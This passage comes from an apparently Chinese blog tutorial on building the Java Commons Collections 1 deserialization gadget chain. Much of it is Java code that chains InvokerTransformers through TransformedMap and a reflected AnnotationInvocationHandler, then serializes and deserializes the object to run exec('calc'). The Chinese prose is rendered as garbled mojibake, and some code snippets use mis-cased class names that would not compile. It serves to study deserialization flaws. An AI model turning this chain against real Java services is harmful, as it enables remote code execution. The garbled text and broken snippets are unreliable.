class="comment">//è°ƒç”¨setValueæ–¹æ³•ï¼Œå¹¶æŠŠå¯¹è±¡rå½“ä½œå¯¹è±¡ä¼ å…¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105210341164.png" class="" title="This is an example image"><p>åˆ°è¿™é‡Œæˆ‘ä»¬å…ˆé‡å¤´ç†ä¸€ä¸‹ï¼š</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†TransformedMapè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨å®ƒçš„checkSetValueæ–¹æ³•ä»è€Œæ¥è°ƒç”¨transformæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»çš„æ„é€ å™¨å’ŒcheckSetValueæ–¹æ³•éƒ½æ˜¯protectedæƒé™ï¼Œåªèƒ½ä»ç±»ä¸­è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨decorateæ–¹æ³•æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»ã€‚åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªhashmapï¼Œå› ä¸ºdecorateæ–¹æ³•ä¸­éœ€è¦ä¼ å…¥ï¼Œå¹¶ä¸”è°ƒç”¨putæ–¹æ³•ç»™ä»–èµ‹å€¼ä»¥ä¾¿ä»–éå†mapä»è€Œè°ƒç”¨setValueæ–¹æ³•ã€‚ç„¶åæŠŠè¿™ä¸ªmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œå®ä¾‹åŒ–æˆäº†ä¸€ä¸ªtransformedmapå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿæ˜¯Mapç±»å‹çš„ï¼Œç„¶åæˆ‘ä»¬å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œéå†ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è°ƒç”¨setValueæ–¹æ³•ï¼Œè€Œæ°å·§åˆé‡åˆ°äº†é‡å†™çš„setValueçš„å‰¯ç±»ï¼Œè¿™ä¸ªé‡å†™çš„æ–¹æ³•åˆšå¥½è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé—­ç¯ã€‚</p><p>ä½†è¿™åªæ˜¯ä¸€ä¸ªå°æ’æ›²ï¼Œç»ˆç©¶ä¸æ˜¯æˆ‘ä»¬æ‰€å¸Œæœ›çš„readObjectæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªreadObjectæ–¹æ³•æ¥ä»£æ›¿ä¸Šè¿°çš„éå†MapåŠŸèƒ½ã€‚</p><h2 id="æ„é€ é“¾å­ç¬¬ä¸‰æ­¥-å¯»æ‰¾setValueè°ƒç”¨å¤„-é“¾é¦–"><a href="#æ„é€ é“¾å­ç¬¬ä¸‰æ­¥-å¯»æ‰¾setValueè°ƒç”¨å¤„-é“¾é¦–" class="headerlink" title="æ„é€ é“¾å­ç¬¬ä¸‰æ­¥-å¯»æ‰¾setValueè°ƒç”¨å¤„-é“¾é¦–"></a>æ„é€ é“¾å­ç¬¬ä¸‰æ­¥-å¯»æ‰¾setValueè°ƒç”¨å¤„-é“¾é¦–</h2><p><strong>å¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ª <code>readObject()</code> é‡Œé¢è°ƒç”¨äº† <code>setValue()</code> å°±å¤ªå¥½äº†</strong></p><p>è€æ ·å­ï¼ŒsetValueå¯»æ‰¾ç”¨æ³•ã€‚æˆ‘å‹’ä¸ªè±†ï¼Œç›´æ¥å‘ç°ä¸€ä¸ªè°ƒç”¨äº†setValueçš„readObjectæ–¹æ³•ã€‚å¾ˆå®Œç¾çš„å®ç°äº†ä»£æ›¿ä¹‹å‰Mapéå†åŠŸèƒ½</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105214636730.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="comment">//æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç»§æ‰¿äº†æ³¨è§£çš„classï¼Œç¬¬äºŒä¸ªæ˜¯ä¸ªMap,ç¬¬äºŒä¸ªå‚æ•°æˆ‘ä»¬å¯æ§ï¼Œå¯ä»¥ä¼ å…¥æˆ‘ä»¬ä¹‹å‰çš„transformedmapç±»</span></span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»ä¸­çš„memberValuesæ˜¯å¯æ§çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±çœ‹ä¼ å…¥è‡ªå·±éœ€è¦çš„ï¼Œç„¶åå®ç°setValueæ–¹æ³•ã€‚æ ¹æ®å‰é¢çš„entry.setValueï¼Œé‚£ä¹ˆè¿™é‡Œçš„memberValueå°±è¦ç›¸å½“äºentryï¼ŒmemberValueså°±ç›¸å½“äºæ˜¯transformedmapã€‚</p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®šä¹‰è¿™ä¸ªç±»çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰publicä¹‹ç±»çš„å£°æ˜ï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªç±»åªèƒ½åœ¨æœ¬åŒ…ä¸‹è¢«è°ƒç”¨(sun.reflect.annotation)ï¼Œæˆ‘ä»¬æƒ³è¦åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œå°±éœ€è¦è¿›è¡Œåå°„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokertransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    <span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokertransformer);</span><br><span class="line">    <span class="comment">/*for(Map.Entry entry:transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">            entry.setValue(r);</span></span><br><span class="line"><span class="comment">      &#125;*/</span></span><br><span class="line">    <span class="comment">//åå°„è·å–AnnotationInvocationHandlerç±»</span></span><br><span class="line">    Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);<span class="comment">//è·å–æ„é€ å™¨</span></span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//ä¿®æ”¹ä½œç”¨åŸŸ</span></span><br><span class="line">    Object o=constructor.newInstance(Override.class,transformedmap);<span class="comment">//è¿™é‡Œç¬¬ä¸€ä¸ªæ˜¯å‚æ•°æ˜¯æ³¨è§£çš„ç±»åŸå‹ï¼Œç¬¬äºŒä¸ªå°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ç±»</span></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬æ»¡æ€€æœŸå¾…æ‰§è¡Œè¿™ä¸²ä»£ç æ—¶ï¼Œå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼å…¶å®è¿™æ®µä»£ç è¿˜æ˜¯å­˜åœ¨å¾ˆå¤šç¼ºé™·çš„ã€‚æˆ‘ä»¬å¾€ä¸‹åˆ†æ</p><h2 id="å¼¥è¡¥é“¾å­ç¼ºé™·"><a href="#å¼¥è¡¥é“¾å­ç¼ºé™·" class="headerlink" title="å¼¥è¡¥é“¾å­ç¼ºé™·"></a>å¼¥è¡¥é“¾å­ç¼ºé™·</h2><h3 id="ä¸€ã€Runtimeç±»ä¸èƒ½åºåˆ—åŒ–"><a href="#ä¸€ã€Runtimeç±»ä¸èƒ½åºåˆ—åŒ–" class="headerlink" title="ä¸€ã€Runtimeç±»ä¸èƒ½åºåˆ—åŒ–"></a><strong>ä¸€ã€Runtimeç±»ä¸èƒ½åºåˆ—åŒ–</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106094958514.png" class="" title="This is an example image"><p>æˆ‘ä»¬è·Ÿè¿›Runtimeç±»å¯ä»¥å‘ç°ä»–å¹¶æ²¡æœ‰ç»§æ‰¿serializableæ¥å£ï¼Œä¸èƒ½è¿›è¡Œåºåˆ—åŒ–ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥è·å–Runtimeç±»çš„åŸå‹ç±»ï¼Œå®ƒçš„åŸå‹ç±»classæ˜¯å­˜åœ¨serializableæ¥å£çš„ï¼Œ<code>Runtime.class</code> æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è·å¾—ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡å‘¢ï¼Ÿå¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªé™æ€çš„getRuntime()æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œç›¸å½“äºæ˜¯ä¸€ç§å•ä¾‹æ¨¡å¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//è·å–ç±»åŸå‹</span></span><br><span class="line">Method getRuntime=rr.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//è·å–getRuntimeæ–¹æ³•</span></span><br><span class="line">Runtime r=(Runtime)getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//è·å–å®ä¾‹åŒ–å¯¹è±¡ï¼Œå› ä¸ºè¯¥æ–¹æ³•ä¸ºæ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥å…¨ä¸ºnull</span></span><br><span class="line">Method exec=rr.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//è·å–execæ–¹æ³•</span></span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);<span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°è¿™æ ·å°±å¯ä»¥å®ç°åºåˆ—åŒ–ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨transformæ¥å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Method getRuntime= rr.getDeclaredMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line"><span class="comment">Runtime r=(Runtime) getRuntime.invoke(null,null);</span></span><br><span class="line"><span class="comment">Method exec=rr.getDeclaredMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">exec.invoke(r,&quot;calc&quot;);*/</span></span><br><span class="line"><span class="comment">//åˆ©ç”¨transformæ–¹æ³•å®ç°ä¸Šè¿°ä»£ç </span></span><br><span class="line">Method getRuntime=(Method)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);<span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–getRuntimeæ–¹æ³•ï¼Œå®ƒçš„å…·ä½“æ“ä½œæ­¥éª¤ç±»ä¼¼ä¹‹å‰</span></span><br><span class="line"></span><br><span class="line">Runtime r=(Runtime)<span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntime);<span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–invokeæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);<span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–execæ–¹æ³•ï¼Œå¹¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·è¦ä¸€ä¸ªä¸ªåµŒå¥—åˆ›å»ºå‚æ•°å¤ªéº»çƒ¦äº†ï¼Œæˆ‘ä»¬è¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªCommons Collectionsåº“ä¸­å­˜åœ¨çš„ChainedTransformerç±»ï¼Œå®ƒä¹Ÿå­˜åœ¨transformæ–¹æ³•å¯ä»¥å¸®æˆ‘ä»¬éå†InvokerTransformerï¼Œå¹¶ä¸”è°ƒç”¨transformæ–¹æ³•</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106103853342.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªTransformeræ•°å€¼ç”¨äºå‚¨å­˜InvokerTransformerçš„æ•°æ®ï¼Œä¾¿äºéå†</span></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Invokertransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//è°ƒç”¨å«å‚æ„é€ å™¨ä¼ å…¥Transformeræ•°ç»„ï¼Œç„¶åè°ƒç”¨transformæ–¹æ³•ï¼Œè¿™é‡Œå¯¹è±¡åªéœ€è¦ä¼ ä¸€ä¸ªåŸå§‹çš„Runtimeå°±è¡Œï¼Œå› ä¸ºå…¶ä»–éƒ½æ˜¯åµŒå¥—çš„ã€‚</span></span><br><span class="line">ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">Chainedtransformer</span>(transformers);</span><br><span class="line">chainedtransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªé—®é¢˜-Runtimeç±»ä¸èƒ½åºåˆ—åŒ–-æˆåŠŸè§£å†³ï¼Œä½†ä¾ç„¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p>ä¸åªä¸€ä¸ªé—®é¢˜ã€‚</p><h3 id="äºŒã€ç»•è¿‡AnnotationInvocationHandlerç±»readObjectæ–¹æ³•ä¸­çš„åˆ¤æ–­æ¡ä»¶"><a href="#äºŒã€ç»•è¿‡AnnotationInvocationHandlerç±»readObjectæ–¹æ³•ä¸­çš„åˆ¤æ–­æ¡ä»¶" class="headerlink" title="äºŒã€ç»•è¿‡AnnotationInvocationHandlerç±»readObjectæ–¹æ³•ä¸­çš„åˆ¤æ–­æ¡ä»¶"></a><strong>äºŒã€ç»•è¿‡AnnotationInvocationHandlerç±»readObjectæ–¹æ³•ä¸­çš„åˆ¤æ–­æ¡ä»¶</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106104748114.png" class="" title="This is an example image"><p>è¿™é‡Œå­˜åœ¨ä¸¤å¤„åˆ¤æ–­éœ€è¦ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (memberType != null) &#123;</span><br><span class="line">if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹ç¬¬ä¸€ä¸ªåˆ¤æ–­è¯­å¥ï¼Œæ˜¯å¯¹memberTypeè¿›è¡Œåˆ¤æ–­çš„ã€‚è·Ÿè¸ªmemberTypeï¼Œæ˜¯ä»memberTypesæ¥çš„ï¼ŒmemberTypesåˆæ˜¯ä»annotationType.memberTypes();æ¥çš„ï¼Œè€ŒannotationTypeåˆæ˜¯ä»annotationType &#x3D; AnnotationType.getInstance(type);æ¥çš„ã€‚</p><p>é‚£ä¹ˆå…¶å®å°±æ˜¯ä»typeæ¥çš„ã€‚</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106124951805.png" class="" title="This is an example image"><p>typeå…¶å®æ˜¯ä»æ„é€ å™¨ä¼ å‚æ¥çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å†å›å¤´çœ‹æˆ‘ä»¬å¯¹æ„é€ å™¨çš„ä¼ å‚ï¼Œå‘ç°typeå¯¹åº”Override.classï¼Œè¿™é‡ŒmemeberTypeæ˜¯è·å–æ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œç„¶åå¹¶ä¸”æ£€æŸ¥é”®å€¼å¯¹ä¸­é”®åæ˜¯å¦æœ‰å¯¹åº”çš„åç§°ï¼Œè€Œæˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ³¨è§£æ˜¯æ²¡æœ‰æˆå‘˜å˜é‡çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object o=constructor.newInstance(Override.class,transformedmap);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106125501951.png" class="" title="This is an example image"><p>è€Œæˆ‘ä»¬å‘ç°å¦ä¸€ä¸ªæ³¨è§£:Targetä¸­æœ‰ä¸ªåä¸ºvalueçš„æˆå‘˜å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ³¨è§£,å¹¶æ”¹ç¬¬ä¸€ä¸ªé”®å€¼å¯¹çš„å€¼ä¸ºvalueå³å¯é€šè¿‡ä¸¤ä¸ªåˆ¤æ–­ã€‚</p><p>ä½†æ˜¯ä¾ç„¶ä¸èƒ½å¼¹è®¡ç®—å™¨ã€‚</p><h3 id="ä¸‰ã€checkSetValueä¼ å…¥å€¼ä¸æ˜¯Runtime-class"><a href="#ä¸‰ã€checkSetValueä¼ å…¥å€¼ä¸æ˜¯Runtime-class" class="headerlink" title="ä¸‰ã€checkSetValueä¼ 